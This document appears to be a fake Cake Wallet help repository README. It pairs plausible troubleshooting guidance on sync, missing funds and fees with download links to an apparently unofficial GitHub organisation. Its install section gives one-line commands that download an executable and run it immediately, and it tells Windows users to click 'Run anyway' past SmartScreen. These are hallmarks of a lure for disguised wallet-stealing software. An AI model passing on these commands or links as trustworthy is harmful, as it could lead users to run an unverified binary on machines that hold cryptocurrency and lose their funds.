![Cake Wallet Help: Fixes for Sync, Funds and Fees](assets/cake-wallet-guide-help-hub-banner.png)

# Cake Wallet Help: Fixes for Sync, Funds and Fees

When the balance is wrong, the sync is stuck or a send has not arrived.

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/blob/main/LICENSE.md"><img src="assets/badge-license.svg" alt="License"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest"><img src="assets/badge-release.svg" alt="Release"></a></p>

## Downloads - v6.4.5

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`cake-wallet-desktop-v6.4.5-windows.exe`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`cake-wallet-desktop-v6.4.5-macos.dmg`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`cake-wallet-desktop-v6.4.5-linux.xz`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz) |

> Diagnose in order: build, node, confirmations, account. Most reported problems end at step two, and a reinstall before step one has cost people their phrase.

## What this repository is for
This repository holds the pages you need when something is already wrong. A balance that does not match, a Monero wallet that never finishes syncing, a token that arrived but stayed invisible, a fee that left a transaction pending for hours, or an app that closes the moment it opens. Each page starts from the symptom, names the causes in the order they actually occur, and says what to do next, including the cases where the honest answer is that the funds went somewhere else. The rule across all of them is the same: check the cheap explanations first, because a rescan, a reinstall or a new wallet costs hours and a wrong reinstall can cost the wallet itself. The pages also cover the questions that are really product questions, like which coins are supported or how to tell a real support message from an impersonator, because those are answered faster by a page than by a reply. Each page names the symptom in the words people actually type, then orders the causes by cost: the build, then the connection, then the data, and only then the destructive options. Where a fault cannot be fixed from inside the app, the page says what the outcome will be before you spend an evening on it. A page that ends in a rescan or a reinstall always says what the cheaper checks were first, because the expensive options are the ones that can lose a wallet. Read the whole page before acting on it; several of these faults change shape halfway through, and the second half of the page is written for the state you will be in by then.

## Who it is for
- Anyone whose balance disagrees with what an exchange or a sender says was sent.
- Monero users stuck on a sync that has not moved for hours.
- People who added a token, a chain or a node and cannot see the result they expected.
- Readers who received a suspicious message claiming to be Cake Wallet support.
- Anyone who has already tried a reinstall and wants to know what else is left before doing it again.

## Start here
- [cake-wallet-funds-not-appearing](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-funds-not-appearing.md) - Check balance, account, confirmations and sender before you conclude that a payment is lost.
- [cake-wallet-monero-sync](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-monero-sync.md) - Tell a slow first sync from a stuck one and fix the node that is holding the wallet up.
- [cake-wallet-app-not-opening](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-app-not-opening.md) - Triage a wallet that closes on launch without reinstalling over a backup you have not checked.
- [cake-wallet-verify-download](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-verify-download.md) - Compare hashes against the release page and recognise the messages that are never real support.

## How to use these guides
1. Install the current release over the existing app; it keeps the wallet and removes a whole class of faults.
2. Open the page for your exact symptom, not the nearest topic, and read the first section before trying anything.
3. Work through the triage table on that page in order, stopping as soon as the symptom changes.
4. Keep the transaction ID for anything involving a transfer; it is the only evidence that settles where funds went.
5. Only rescan, reinstall or recreate a wallet after the cheaper checks on the page have failed.
6. Write down what you changed, in order: a fault that moves after a node change tells you more than a fault that is simply retried.

## The guides
### Balances and sync
- [cake-wallet-funds-not-appearing](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-funds-not-appearing.md) - Check balance, account, confirmations and sender before you conclude that a payment is lost.
- [cake-wallet-monero-sync](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-monero-sync.md) - Tell a slow first sync from a stuck one and fix the node that is holding the wallet up.
- [cake-wallet-monero-rescan](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-monero-rescan.md) - Rebuild Monero history from the right restore height, and know when a rescan cannot help.
- [cake-wallet-change-node](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-change-node.md) - Switch to a node that answers, or add your own so the wallet's queries stay private.

### Fees and coins
- [cake-wallet-network-fee](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-network-fee.md) - Pick a fee that confirms in reasonable time and learn what cannot be undone once it does.
- [cake-wallet-coin-control](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-coin-control.md) - Choose which coins a Bitcoin payment spends, and why the change output matters afterwards.
- [cake-wallet-custom-tokens](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-custom-tokens.md) - Add a token by contract address on the right network, and see why a balance stays invisible.
- [cake-wallet-usdt-bridge](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-usdt-bridge.md) - Bridge USDT between chains, add the destination token and check both sides before sending more.

### Sending and records
- [cake-wallet-address-book](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-address-book.md) - Save addresses inside the app so one paste error stops being the reason funds go missing.
- [cake-wallet-export-transaction-history](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-export-transaction-history.md) - Export transactions to CSV for your records, with the columns the file actually contains.
- [cake-wallet-sell-crypto](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-sell-crypto.md) - Sell through a provider, follow its deposit instructions exactly and triage a payout that is late.
- [cake-wallet-tron-walletconnect](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-tron-walletconnect.md) - Connect a Tron dApp, scope the session properly and avoid the out-of-energy failure on a transfer.

### Support and safety
- [cake-wallet-verify-download](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-verify-download.md) - Compare hashes against the release page and recognise the messages that are never real support.
- [cake-wallet-official-support](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-official-support.md) - Find the real support routes, report a bug usefully and tell impersonation from the real thing.
- [cake-wallet-app-not-opening](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-app-not-opening.md) - Triage a wallet that closes on launch without reinstalling over a backup you have not checked.
- [cake-wallet-comparison-trust-wallet](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-comparison-trust-wallet.md) - Compare wallets on custody, coins and backups instead of a scoreboard nobody outside can verify.

## What each guide changes
| Task | Guide | Outcome |
| --- | --- | --- |
| Funds are missing | [cake-wallet-funds-not-appearing](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-funds-not-appearing.md) | A confirmed cause, or proof the send went elsewhere |
| Monero will not sync | [cake-wallet-monero-sync](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-monero-sync.md) | A working node and a sync that reaches zero |
| A token is invisible | [cake-wallet-custom-tokens](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-custom-tokens.md) | The token added on the right network |
| A fee left it pending | [cake-wallet-network-fee](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-network-fee.md) | A fee that confirms in reasonable time |
| The app will not start | [cake-wallet-app-not-opening](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-app-not-opening.md) | A build that opens without touching the wallet |
| Support messaged you | [cake-wallet-verify-download](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-verify-download.md) | A verified download and a blocked impersonator |

## Common first questions
### Should I reinstall first?
No. Install the current build over the existing app first, which keeps the data, and confirm the phrase before any uninstall.

### Why does the balance differ from the exchange?
Usually confirmations the wallet has not seen yet, or a deposit sent to another account. Both are checked on the missing-funds page before anything drastic.

### Is Cake Wallet down?
The app has no central service to go down; it talks to nodes and providers. If several people report the same failure, the public repository shows it.

### Can support recover my funds?
No. Nobody at Cake Wallet can move, freeze or reverse a transfer, which is exactly why a message offering to do that is impersonation.

### How long should I wait before assuming the worst?
Long enough for the confirmations the page names: about ten blocks on Monero, a few on Bitcoin. A send that has not confirmed is pending, not lost.

### Can a rescan find funds sent to the wrong address?
No. A rescan re-reads your own wallet's history from the chain, so it cannot find a payment that went to an address you do not control.

## Before you install
- Know your recovery phrase before you uninstall, reinstall or recreate anything.
- Have the transaction ID ready for any transfer you are asking about.
- Install the current release first, so the fault is not simply an old build.
- Check the node your wallet uses before assuming the chain is wrong.
- Note the build number before you ask for help; a report without it cannot be reproduced.
- Check whether the sending service marked the withdrawal complete; that single fact decides who has to act next.

## About and license
Cake Wallet is an open-source, non-custodial multi-currency wallet by Cake Labs. The source in this repository is licensed MIT; read `LICENSE.md` for the exact terms. These pages describe the app as documented at the time of writing and make no promise about builds that are not published here.

## How to install Cake Wallet

<!-- INSTALL-BEGIN -->

### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe">cake-wallet-desktop-v6.4.5-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg">cake-wallet-desktop-v6.4.5-macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
No one-line command is published for Linux. The release ships a compressed archive, not an installer the shell can launch, so the download either needs extracting or needs the Flatpak build instead. Extract it with your file manager, or unpack it in a terminal with `tar -xf`, then run the executable inside the folder.

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz">cake-wallet-desktop-v6.4.5-linux.xz</a> for the portable build, or the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.flatpak">cake-wallet-desktop-v6.4.5-linux.flatpak</a> if your distribution prefers Flatpak.
2. For the archive, extract it and keep the whole folder together.
3. For the Flatpak file, install it with your software centre, or run `flatpak install ./cake-wallet-desktop-v6.4.5-linux.flatpak`.
4. Run the app from the extracted folder or from your application menu.

<!-- INSTALL-END -->
